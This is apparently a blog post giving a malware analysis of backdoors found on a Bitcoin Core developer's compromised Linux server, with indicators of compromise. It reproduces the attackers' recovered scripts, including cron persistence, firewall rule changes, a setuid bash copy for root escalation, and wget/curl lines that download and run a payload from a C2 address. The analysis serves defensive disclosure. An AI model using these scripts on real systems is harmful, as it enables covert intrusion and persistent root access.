---
title: "Multiple Linux Backdoors Discovered Targeting Bitcoin Core Developer — Technical Analysis"
date: 2023-01-19
categories: [malware-analysis, reverse-engineering]
tags: [linux, malware, reverse-engineering, supply-chain, bitcoin]
description: "An in-depth technical analysis of various backdoors discovered in Luke’s compromised Linux server."
toc: true
image:
  path: /assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-08.png
  alt: "Multiple Linux Backdoors Discovered Targeting Bitcoin Core Developer — Technical Analysis"

---

*An in-depth technical analysis of various backdoors discovered in Luke’s compromised Linux server.*

![Photo by Matthew Ball on Unsplash](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-02.png)
_Photo by Matthew Ball on Unsplash_


### Context

First and foremost, I would like to express my gratitude to [Luke](https://twitter.com/LukeDashjr), one of the Core Bitcoin developers, for sharing with me the information he uncovered on his compromised Linux server.

Luke’s, Linux server was targeted in an attack that was quite unfamiliar. This prompted me to [reach](https://twitter.com/lordx64/status/1609908344189329408?s=20&t=8Ory5if2lgvR0BLxipcPUg) out to Luke immediately after I heard the news. After investigating, Luke determined that the attack was originating from direct physical access to his server, resulting in a boot into an unknown external device:


![https://bitcoinhackers.org/@lukedashjr/109379613510993363](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-03.png)
_https://bitcoinhackers.org/@lukedashjr/109379613510993363_

The server in question is hosted by a hosting company known as X. No additional information was provided, but the following is a summary of the events, as reported by Luke, from the point of compromise to the triage of malware:


![https://bitcoinhackers.org/@lukedashjr/109359271504680389](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-04.png)
_https://bitcoinhackers.org/@lukedashjr/109359271504680389_


![https://bitcoinhackers.org/@lukedashjr/109359845142332847](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-05.png)
_https://bitcoinhackers.org/@lukedashjr/109359845142332847_


![https://bitcoinhackers.org/@lukedashjr/109361478324427714](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-06.png)
_https://bitcoinhackers.org/@lukedashjr/109361478324427714_

> Great job to Luke for being able to promptly investigate the malware and sharing it with the community for further analysis.

Now things got a little bit more serious in the 1st January 2023, Luke suspected that his PGP keys were compromised and his BTC stolen:


![https://twitter.com/LukeDashjr/status/1609613748364509184](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-07.png)
_https://twitter.com/LukeDashjr/status/1609613748364509184_

right after that Luke warned the community to be careful downloading Bitcoin Knots and Core since the PGP keys were compromised:


![https://twitter.com/LukeDashjr/status/1609763079423655938](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-08.png)
_https://twitter.com/LukeDashjr/status/1609763079423655938_

> Note: So far there were no signs of Bitcoin Knots supply chain attacks or infections reported by the Bitcoin community.

Luke [Bitcoin](https://fr.wikipedia.org/wiki/Bitcoin) was allegedly stolen, nearly 200BTC valued at $ 3.6 million at the time of the compromise. It is still unclear how the attackers jumped from Luke server, to Luke Workstation (or vice versa).

Luke confirmed that his Workstation was likely compromised,

Luke sent me direct message, and shared with me files he suspects related to the initial compromise of his Linux server. Below is the analysis of these files.


### Technical Analysis

The observed backdoors and tools in this attack comprise a cluster of activities which we have dubbed as UNC1142 (for further information on “UNC” groups, please refer to this [blog post](https://www.mandiant.com/resources/clustering-and-associating-attacker-activity-at-scale)).

Presented below is a comprehensive breakdown of the tools and procedures associated with UNC1142.


#### UNC1142 observed tooling:

**DARKSABER**: a slightly modified variant of [TinyShell](https://github.com/creaktive/tsh) a lightweight client and acts as backdoor providing remote shell execution as well as file transfers.

**SHADOWSTRIKE**: a linux-platform TCP reverse shell written in Perl based of an opensource Perl reverse shell [script](https://github.com/pentestmonkey/perl-reverse-shell/blob/master/perl-reverse-shell.pl).

**NIGHTRAVEN**: Installer of **DARKSABER** and **SHADOWSTRIKE** and their dependencies, modifies the server configuration and installs a setuid bash shell allowing privilege escalation to root.


#### Establish Foothold and Maintain Persistence

Based on the location of the backdoors on the file system, it is likely that **UNC1142** was able to gain sudo or root privileges on the affected host. This aligns with the external media boot attack vector described by Luke, as the attacker can mount the file system and copy any file to any location when booting from external media.

Below are the added/modified files related to this attack:


```bash
/etc/cron.hourly/0ntpupdate (added)
/etc/init.d/rc.local (modified)
/etc/cron.weekly/logrotate (added)
/etc/cron.daily/logrotate (added)
/usr/sbin/pbd (added)
/root/.ssh/authorized_keys (modified)
/usr/libexec/dbus-1/dbus-daemon-launch (added or modified)
/usr/sbin/nptupdate (added)
/usr/sbin/logstatus (added)
```


### UNC1142 tooling analysis:


#### SHADOWSTRIKE

SHADOWSTRIKE is a linux-platform TCP reverse shell written in Perl based of an opensource Perl reverse shell [script](https://github.com/pentestmonkey/perl-reverse-shell/blob/master/perl-reverse-shell.pl). It was configured to communicate to the following C2 server: **80.85.155.34** , on two specific ports: **27032** then **2475.**

It has an option to set the process name of the session, in** **this attack the operators set the process name to **rsyslogd**


![SHADOWSTRIKE process name](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-08.png)
_SHADOWSTRIKE process name_

SHADOWSTRIKE was found at the following path in the compromised server:


```bash
/usr/sbin/pbd
```


#### DARKSABER

After reversing this binary, it shares the exact code base as [TinyShell](https://github.com/creaktive/tsh) with some very minor modifications.

**DARKSABER** provides an operator with shell access to the infected server, with restricted capabilities such as uploading and downloading files. What is noteworthy about this backdoor is that it is extremely difficult to alter or gain control over it (in the event of a sinkhole) without knowledge of a secret key that is used to authenticate and encrypt client-server communications using AES-CBC-128 encryption (the verification happens for every sent/received packet)

The secret key utilized in the recovered binary was set to “**Fuckyou1**”


![disassembly DARKSABER](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-08.png)
_disassembly DARKSABER_

The client challenge was left unchanged and corresponds to the opensource version of the tool:


```cpp
unsigned char challenge[16] =   /* version-specific */

    "\x58\x90\xAE\x86\xF1\xB9\x1C\xF6" \
    "\x29\x83\x95\x71\x1D\xDE\x58\x0D";
```


![DARKSABER challenge keys](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-08.png)
_DARKSABER challenge keys_

**DARKSABER **at launch will automatically try to connect to its C2 server hosted at ip: **8.6.8.62 **on port** 8443**


![DARKSABERdisassembly showing c2 configuation](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-08.png)
_DARKSABERdisassembly showing c2 configuation_


#### DARKSABERpersistence:


![DARKSABER delivery](/assets/images/posts/multiple-linux-backdoors-discovered-targeting-bitcoin-core-d/img-08.png)
_DARKSABER delivery_

**DARKSABER** is downloaded and installed by **NIGHTRAVEN **and is replicated in various locations within the file system with file names that appear to be legitimate programs:


```bash
/usr/sbin/logstatus
/usr/sbin/nptupdate
```

In the compromised server there was the following entry in **/etc/cron.daily/logrotate **allowing the execution of **DARKSABER **on a daily basis:


```bash
#!/bin/sh
logcount=`ps aux|grep -v pts|grep -v grep|grep root|grep -E '/bin/bash'|wc -l`
if [ $logcount == 0 ];then
    /usr/sbin/logstatus
fi
test -x /usr/sbin/logrotate || exit 0
/usr/sbin/logrotate /etc/logrotate.conf
```

TINYSHELL based backdoors like **DARKSABER **were used by multiple threat groups ranging from APTs like [APT31](https://blog.sekoia.io/fr/marcher-sur-les-empreintes-de-linfrastructure-apt31/) , [PassCV](https://hitcon.org/2017/pacific/0composition/pdf/Day1/R1/R1-4.12.7.pdf), [ChamelGang](https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/new-apt-group-chamelgang/) or UNC groups like: [UNC1945](https://www.mandiant.com/resources/blog/live-off-the-land-an-overview-of-unc1945) or [UNC2891](https://www.mandiant.com/resources/blog/unc2891-overview) and numerous targeted attacks since [2012](https://twitter.com/billyleonard/status/1458531997576572929).

Finally, it is worth mentioning that TINYSHELL-based backdoor infections are often linked to rootkit infections. A notable example is the [CAKETAP](https://www.mandiant.com/resources/blog/unc2891-overview) malware reported in [UNC2891](https://www.mandiant.com/resources/blog/unc2891-overview), which was used to conceal network connections related to TINYSHELL.

> It remains uncertain if Luke’s server was infected with a rootkit, but it is a possibility that should be investigated.


#### NIGHTRAVEN

**NIGHTRAVEN **is an installation script that was found at the following location:


```bash
/etc/cron.hourly/0ntpupdate
```

At launch **NIGHTRAVEN **looks for **SHADOWSTRIKE** location usually in **/usr/sbin/pbd, **and parse it to determine the c2 communication port configured by the operator. Once determined, **NIGHTRAVEN** changes the firewall rules to allow outbound traffic to the configured **SHADOWSTRIKE **c2 port:


```bash
pbdport=`cat /usr/sbin/pbd |grep 'port = '|grep -P '\d+' -o`

if [ -f /usr/bin/firewall-cmd ];then
    firewalldcount=$(cat /etc/firewalld/direct.xml|grep $pbdport|wc -l)
    if [ $firewalldcount == 0 ];then
      firewall-cmd --permanent --direct --add-rule ipv4 filter OUTPUT 0 -m state --state ESTABLISHED,RELATED -j ACCEPT
      firewall-cmd --permanent --direct --add-rule ipv4 filter OUTPUT 1 -p tcp --dport 80 -j ACCEPT
      firewall-cmd --permanent --direct --add-rule ipv4 filter OUTPUT 1 -p tcp --dport 443 -j ACCEPT
      firewall-cmd --permanent --direct --add-rule ipv4 filter OUTPUT 1 -p tcp --dport 8443 -j ACCEPT
      firewall-cmd --permanent --direct --add-rule ipv4 filter OUTPUT 1 -p tcp --dport $pbdport -j ACCEPT

      firewall-cmd --reload
    fi
fi

if [ -f /usr/sbin/iptables -o -f /sbin/iptables ];then
      iptablescount=$(cat /etc/sysconfig/iptables|grep $pbdport|wc -l)
      if [ $iptablescount == 0 ];then
 iptables -I OUTPUT -p tcp --dport 80 -j ACCEPT
 iptables -I OUTPUT -p tcp --dport 443 -j ACCEPT
 iptables -I OUTPUT -p tcp --dport 8443 -j ACCEPT
 iptables -I OUTPUT -p tcp --dport $pbdport -j ACCEPT
 service iptables save
      fi
fi


if [ -f /usr/sbin/ufw ];then
 ufw default allow outgoing
 ufw reload
fi
```

> a seen above, a rule for the port 8443 is also set, as it is the port used by **DARKSABER**

After changing firewall rules, **NIGHTRAVEN** copies bash binary into **/usr/libexec/dbus-1/dbus-daemon-launch**, set the file’s time same as **/bin/bash** and sets **setuid** bit to it (root):


```bash
cp /bin/bash /usr/libexec/dbus-1/dbus-daemon-launch
    touch -r /bin/bash /usr/libexec/dbus-1/dbus-daemon-launch
    chmod 4755 /usr/libexec/dbus-1/dbus-daemon-launch
```

> This will allow a quick privilege escalation to root by any non-root user in the server. The alteration of the time stamp will make it challenging to identify when the file was last modified, making it a useful strategy for evading suspicion.”

Then installs Perl in the system and runs **SHADOWSTRIKE.**

Finally, **NIGHTRAVEN** downloads a copy of **DARKSABER **from the server: **45.14.224.223** and place it in the following location **/usr/sbin/nptupdate**


```bash
perl /usr/sbin/pbd &
npt=/usr/sbin/nptupdate
url=45.14.224.223/systemd


if [ -f /usr/bin/wget ];then
  wget -t 3 -T 25 $url -O $npt
  chmod +x $npt
 else
  curl --max-time 25 --retry 3  -o $npt $url
  chmod +x $npt
fi
```

A code snippet copy of **NIGHTRAVEN **was found at the following path **/etc/cron.weekly/logrotate** and it is reponsible to download **DARKSABER **as well but this time executing it:


```bash
#!/bin/sh
npt=/usr/sbin/nptupdate
url=45.14.224.223/systemd

if [ -f /usr/bin/wget ];then
  wget -t 3 -T 25 $url -O $npt
  chmod +x $npt
 else
  curl --max-time 25 --retry 3  -o $npt $url
  chmod +x $npt
fi

/usr/sbin/nptupdate
rm -rf /usr/sbin/nptupdate
```

**NIGHTRAVEN **is launched from **/etc/init.d/rc.local, UNC1142 **tampered with this file and added an entry to execute **NIGHTRAVEN **installation script. **/etc/init.d/rc.local **is a superuser startup script, and runs after each boot right after normal services are started, allowing **NIGHTRAVEN **to persist and execute after each reboot.


### Conclusion:

**UNC1142** used an uncommon and previously unseen attack vector, by booting Luke’s server from external media and infecting it with backdoors.

From there, the attackers were able to remotely control the server through the various access points they had established. The information provided in this blog post does not encompass the entire scope of this attack, but rather presents some initial findings in an effort to shed light on what occurred on Luke’s servers and raise awareness of how things transpire when targeted by advanced threat actors.


### Indicators of Compromise


#### File SHA-256 hashes


```vbnet
NIGHTRAVEN 802e6e0ecf1af2e85a732b5c38b4ee1a490fb1e4c468b4dff1805d8a0ad05f7e
 DARKSABER 5252128f60c2485784310d32d8a5b4a7f172c89b1d280a33f53abd1011a1645d
 SHADOWSTRIKE 9028e379ec23c1e52f209143e2f740c8678fcbf3d03599439eca3fdd833f263d
 SHADOWSTRIKE 873df01c63a60cf9456c1446c2f69174e848d55936faaf7360dd47fd2c616829
```


#### C2 Hosts IP addresses:ports


```makefile
80.85.155.34:27032 (SHADOWSTRIKE C2)
80.85.155.34:2475  (SHADOWSTRIKE C2)
45.14.224.223 (NIGHTRAVEN)
8.6.8.62:8443 (DARKSABER C2)
```
